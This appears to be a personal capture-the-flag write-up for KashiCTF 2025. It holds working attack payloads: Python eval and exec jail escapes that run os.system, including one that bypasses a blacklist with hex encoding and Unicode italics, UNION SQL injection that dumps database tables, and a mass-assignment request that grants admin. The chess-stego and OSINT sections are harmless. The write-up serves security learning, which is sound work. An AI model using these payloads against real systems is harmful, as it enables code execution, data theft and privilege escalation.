---
date: February 24, 2025
description: API vulns, jails, and some OSINT
platform: KashiCTF 2025
categories: Web, OSINT, Misc
tags:
---
#jails #python #sqli/Union #steganography #chess  #API #mass-assignment 

# Misc
## Easy Jail 
I made this calculator. I have a feeling that it's not safe :(

chall.py
```python
def calc(op):
	try : 	
		res = eval(op)
	except Exception as e:
		return print("Wrong operation", e)
	return print(f"{op} --> {res}")

def main():
	while True :
		inp = input(">> ")
		calc(inp)

if __name__ == '__main__':
	main()
```
solution
1. create lambda and runs os that returns something (too lazy to setup revshellc)
2. run that lambda

```python
exec("f = lambda: __import__('os').system(\"id\")")
exec("global f; f = lambda: __import__('os').system(\"ls\")")
exec("global f; f = lambda: __import__('os').system(\"cat flag.txt\")")
exec("global f; f = lambda: __import__('os').system(\"cat /flag.txt\")")

(lambda: __import__('os').system('ls'))()
(lambda: __import__('os').system('cat /flag.txt'))()

__import__('os').system('ls')
__import__('os').system('cat /flag.txt')
```
KashiCTF{3V4L_41NT_54F3}

## Easy Jail 2 
I made a completely secure calculator this time.

chall.py
```python
BLACKLIST = ["open", "input", "eval", "exec", "import", "getattr", "sh", "builtins", "global"]
def calc(op):
    try: 	
        res = eval(op)
    except Exception as e:
        return print("Wrong operation", e)
    return print(f"{op} --> {res}")

def main():
    while True :
        inp = input(">> ")
        if any(bad in inp for bad in BLACKLIST) :
            print("Are you tying to hack me !!!!!")
        else : 
            calc(inp)

if __name__ == '__main__':
	main()#!/usr/bin/env python3
```

> similar to first chall but added string blacklist 

solution 
create solve.py that generates payload to hex, then italicize the payload. italizing everything should work. but i wanted to find solution without exec, but the global ban is just annoying 

```python
𝘦𝘹𝘦𝘤(bytes.fromhex('676c6f62616c20663b2066203d206c616d6264613a205f5f696d706f72745f5f28276f7327292e73797374656d28276c732729').decode())
```
learned how running inline lambda though, and the globals functions usecases in bypassing jails 

KashiCTF{C4N_S71LL_CL3AR_8L4CKL15T_v4Ratwt3}
# Web
## Corporate Life 1 
The Request Management App is used to view all pending requests for each user. It’s a pretty basic website, though I heard they were working on something new.

Anyway, did you know that one of the disgruntled employees shared some company secrets on the Requests Management App, but it's status was set _denied_ before I could see it. Please find out what it was and spill the tea!

`This Challenge unlocks another challenge in this Series`

### solution
Started with fuzzing api endpoints and parameters while fuzzing i found an interesting endpoint from the javascript source files `/_next/static/bkat3_n9dfvE_URrWvN1g/_buildManifest.js`

![](_attachments/Pasted%20image%2020250223120710.png)

accessing the endpoint and seeing how request is made we get something like 

```http
POST /api/list-v2 HTTP/1.1
Host: kashictf.iitbhucybersec.in:5727
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kashictf.iitbhucybersec.in:5727/
Connection: keep-alive
Cookie: session=caf62b89-3555-4188-be8c-ea9379bd7e7d.d-XmBhNu0KeC4wOAuoargANfRms
Content-Type: application/json
Content-Length: 32

{
	"filter": ""
}
```
being requested in the home page. Try generic SQLi and it returned the flag, this shows requests with status of any value 

```json
//req
{
	"filter": "a' OR 1=1-- -"
}

// response
// [ ...
{"employee_name":"peter.johnson","request_detail":"Shitty job, I hate working here, I will leak all important information like KashiCTF{s4m3_old_c0rp0_l1f3_i1xudBBY}","status":"denied","department":"Logistics","role":"Supply Chain Manager","email":"peter.johnson@corp.com"},
//... ]
```
## Corporate Life 2 
The disgruntled employee also stashed some company secrets deep within the database, can you find them out?

### solution
Similar to part 1 but he have to exfiltrate data now

Fingerprint first what database were dealing
```sql
@@version
sqlite_version() 
```

Get Tables
```json
// request 
{"filter":"1' UNION SELECT null,null,null,null,sql,sqlite_version() FROM sqlite_master-- -"}

// response 
{"employee_name":null,"request_detail":null,"status":null,"department":null,"role":"CREATE TABLE flags (\n      request_id INTEGER,\n      secret_flag TEXT,\n      FOREIGN KEY (request_id) REFERENCES requests(id)\n    )","email":"3.44.2"},
```

```web
POST /api/list-v2 HTTP/1.1
Host: kashictf.iitbhucybersec.in:6619
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kashictf.iitbhucybersec.in:6619/v2-testing
Content-Type: application/json
Content-Length: 106
Origin: http://kashictf.iitbhucybersec.in:6619
Connection: keep-alive
Cookie: session=caf62b89-3555-4188-be8c-ea9379bd7e7d.d-XmBhNu0KeC4wOAuoargANfRms

{"filter":"1' UNION SELECT null,null,null,null,GROUP_CONCAT(secret_flag),sqlite_version() FROM flags-- -"}
```

response
```json
[{"employee_name":null,"request_detail":null,"status":null,"department":null,"role":"KashiCTF,{b0r1ng_o,ld_c0rp0,_l1f3_am_,1_r1gh7_,AJQNhPAw}","email":"3.44.2"}]
```

## SuperFastAPI
Made my verty first API!

However I have to still integrate it with a frontend so can't do much at this point lol.

### solution
Just some API documentation exposed, update profile is vulnerable to mass assignment  


![](_attachments/Pasted%20image%2020250223150547.png)

An attacker can simply update the role and then get the flag 

```bash
curl -X 'PUT' \
  'http://kashictf.iitbhucybersec.in:49173/update/john' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "fname": "John",
  "lname": "Doe",
  "email": "john.doe@example.com",
  "gender": "male"
   "role": "admin"
}'
```

flag 
```bash
curl -X 'GET' \
  'http://kashictf.iitbhucybersec.in:49173/flag/john' \
  -H 'accept: application/json'
```
KashiCTF{m455_4551gnm3n7_ftw_hgKBgYzSX}


# Forensics
## Stego Gambit
I know how to checkkmate 

```
Bh1_Kxa2_Qg2#
bh1_kxa2_qg2#

d5-h1_b2-a2_c6-g2

h1_a2_g2#
```
i can more or less know the value of key but idk where to find the cipher text. learned about stegsolve though 

solving similar to this searched by rei
[https://medium.com/@sachalraja/deconsrtuct-f-gambit-challenge-writeup-8d526d4e8c60](https://medium.com/@sachalraja/deconsrtuct-f-gambit-challenge-writeup-8d526d4e8c60 "https://medium.com/@sachalraja/deconsrtuct-f-gambit-challenge-writeup-8d526d4e8c60")


# OSINT
## Kings 
```
Did you know the cosmic weapons like this? I found similar example of such weapons on the net and it was even weirder. This ruler's court artist once drew the most accurate painting of a now extinct bird. Can you tell me the coordinates upto 4 decimal places of the place where this painting is right now.

Flag Format: KashiCTF{XX.XXXX_YY.YYYY}
```

Our research end up in somewhere in Egyptian Museum Kairo, meidum geese

https://egyptianmuseumcairo.eg/artefacts/meidum-geese/
https://egyptianmuseumcairo.eg/egyptian-museum-map/?location=room32#ground-floor

We just couldn't get the exact coords, if its for the museum or the painting, 

guessing something like didn't work
```
KashiCTF{30.0480_31.2334}
KashiCTF{30.0479_31.2334}
KashiCTF{30.0478_31.2334}
KashiCTF{30.0477_31.2334}
KashiCTF{30.0476_31.2334}
KashiCTF{30.0475_31.2334}
```

> Asked discord for hints but they closed our ticket without replying 

we gave up

## Old Diner 
My friend once visited this place that served ice cream with coke. He said he had the best Greek omlette of his life and called it a very american experience. Can you find the name of the diner and the amount he paid?

Flag Format: `KashiCTF{Name_of_Diner_Amount}`

**For clarification on the flag format** The diner's name is in title case with spaces replaced by underscores. The amount is without currency sign, and in decimal, correct to two decimal places, i.e. `KashiCTF{Full_Diner_Name_XX.XX}`


```
- Search google "very american experience" greek omelette
- https://www.tripadvisor.com.sg/Restaurant_Review-g60763-d522599-Reviews-Lexington_Candy_Shop-New_York_City_New_York.html

navigate to page 5!
- https://www.tripadvisor.com.sg/Restaurant_Review-g60763-d522599-Reviews-or60-Lexington_Candy_Shop-New_York_City_New_York.html
- u see this dude https://www.tripadvisor.com.sg/ShowUserReviews-g60763-d522599-r737610550-Lexington_Candy_Shop-New_York_City_New_York.html
```

KashiCTF{Lexington_Candy_Shop_41.65}